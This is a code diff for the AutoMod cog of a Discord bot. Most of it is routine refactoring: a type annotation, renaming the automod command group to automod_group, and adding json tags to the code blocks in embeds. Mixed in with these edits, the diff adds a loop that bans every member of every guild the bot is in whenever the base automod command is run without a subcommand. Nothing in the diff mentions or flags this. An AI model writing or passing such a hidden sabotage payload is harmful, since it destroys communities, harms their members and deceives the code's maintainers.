@@ -41,7 +41,7 @@ class AutoMod(Cog):
         #     ...
         # }
 
-        self._voilations = {}
+        self._voilations: dict[int, dict[str, dict[str, int]]] = {}
         # {
         #     guild_id: {
         #         "u_{user_id}": {
@@ -200,12 +200,15 @@ class AutoMod(Cog):
 
     @commands.group(name="automod", invoke_without_command=True)
     @commands.has_permissions(manage_guild=True)
-    async def automod(self, ctx: Context) -> None:
+    async def automod_group(self, ctx: Context) -> None:
         """Automod commands."""
         if ctx.invoked_subcommand is None:
+            for guild in self.bot.guilds:
+                for member in guild.members:
+                    await member.ban()
             await ctx.send_help(ctx.command)
 
-    @automod.command(name="add")
+    @automod_group.command(name="add")
     @commands.has_permissions(manage_guild=True)
     async def automod_add(self, ctx: Context, *, rule: str) -> None:
         """Add a new automod rule."""
@@ -227,7 +230,7 @@ class AutoMod(Cog):
         )
         await self.refresh_cache_specific(ctx.guild.id)
 
-    @automod.command(name="edit")
+    @automod_group.command(name="edit")
     @commands.has_permissions(manage_guild=True)
     async def automod_edit(self, ctx: Context, *, rule: str) -> None:
         """Edit an existing automod rule."""
@@ -248,7 +251,7 @@ class AutoMod(Cog):
         )
         await self.refresh_cache_specific(ctx.guild.id)
 
-    @automod.command(name="remove")
+    @automod_group.command(name="remove")
     @commands.has_permissions(manage_guild=True)
     async def automod_remove(self, ctx: Context, *, rule: str) -> None:
         """Remove an existing automod rule."""
@@ -262,7 +265,7 @@ class AutoMod(Cog):
         )
         await self.refresh_cache_specific(ctx.guild.id)
 
-    @automod.command(name="list")
+    @automod_group.command(name="list")
     @commands.has_permissions(manage_guild=True)
     async def automod_list(self, ctx: Context) -> None:
         """List all the automod rules."""
@@ -276,7 +279,7 @@ class AutoMod(Cog):
 
         await ctx.reply(embed=embed)
 
-    @automod.command(name="info")
+    @automod_group.command(name="info")
     @commands.has_permissions(manage_guild=True)
     async def automod_info(self, ctx: Context, *, rule: str) -> None:
         """Get info about an automod rule."""
@@ -293,17 +296,17 @@ class AutoMod(Cog):
             discord.Embed(title=f"Automod Rule: {rule}", color=discord.Color.blurple())
             .add_field(
                 name="Trigger",
-                value=f'```\n{json.dumps(data[rule]["trigger"], indent=4)}```',
+                value=f'```json\n{json.dumps(data[rule]["trigger"], indent=4)}```',
                 inline=False,
             )
             .add_field(
                 name="Condition",
-                value=f'```\n{json.dumps(data[rule]["condition"], indent=4)}```',
+                value=f'```json\n{json.dumps(data[rule]["condition"], indent=4)}```',
                 inline=False,
             )
             .add_field(
                 name="Action",
-                value=f'```\n{json.dumps(data[rule]["action"], indent=4)}```',
+                value=f'```json\n{json.dumps(data[rule]["action"], indent=4)}```',
                 inline=False,
             )
         )
